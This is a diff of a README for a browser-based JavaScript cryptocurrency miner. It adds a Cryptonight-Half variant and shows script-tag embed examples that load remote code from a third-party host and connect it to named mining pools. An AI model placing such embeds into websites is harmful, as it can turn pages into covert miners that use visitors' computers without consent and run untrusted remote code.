@@ -1,7 +1,7 @@
 
-Crypto Webminer | Electroneum | Monero | Bytecoin | IntenseCoin | Graft | Sumokoin | Turtlecoin | DERO | Aeon | Ultranote | Masari | Stellite | Cryptonight | Cryptonight-Lite | Cryptonight-Fast | Custom Pool Support - Mining in your Browser
+Crypto Webminer | Electroneum | Monero | Bytecoin | IntenseCoin | Graft | Sumokoin | Turtlecoin | DERO | Aeon | Ultranote | Masari | Stellite | Cryptonight | Cryptonight-Lite | Cryptonight-Fast | Cryptonight-Half | Custom Pool Support - Mining in your Browser
 
-#### Use Crypto Webminer - JavaScript miner on any Stratum Pool for Cryptonight | Cryptonight-Lite | Cryptonight-Fast Coins
+#### Use Crypto Webminer - JavaScript miner on any Stratum Pool for Cryptonight | Cryptonight-Lite | Cryptonight-Fast | Cryptonight-Half Coins
 
 #### LiveTest - https://www.donate.crypto-webminer.com/donate.html
 
@@ -21,11 +21,11 @@ Crypto Webminer | Electroneum | Monero | Bytecoin | IntenseCoin | Graft | Sumoko
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=666?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
-#### Examples: Stellite need ?algo=cn/xtl?variant=2<br> 
+#### Examples: Stellite (Cryptonight-Half) need ?algo=cn/xtl?variant=2<br> 
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn/xtl?variant=2?jason=communitypool.stellite.cash:6677" > </script>
 ```
-#### Examples: Aeon, Turtlecoin & Ultranote need ?algo=cn-lite?variant=1
+#### Examples: Aeon, Turtlecoin, Ultranote need ?algo=cn-lite?variant=1
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn-lite?variant=1?jason=mine.supportaeon.com:3333" > </script>
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn-lite?variant=1?jason=Pool.TRTL.CryptoPool.Space:5555" > </script>
@@ -35,7 +35,7 @@ Crypto Webminer | Electroneum | Monero | Bytecoin | IntenseCoin | Graft | Sumoko
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn-lite?variant=2?jason=pool.nxstream.io:3333" > </script>
 ```
-#### Examples: Masari need ?algo=cn/msr?variant=1<br> 
+#### Examples: Masari (Cryptonight-Fast) need ?algo=cn/msr?variant=1<br> 
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn/msr?variant=1?jason=masari.ingest.cryptoknight.cc:3333" > </script>
 ```
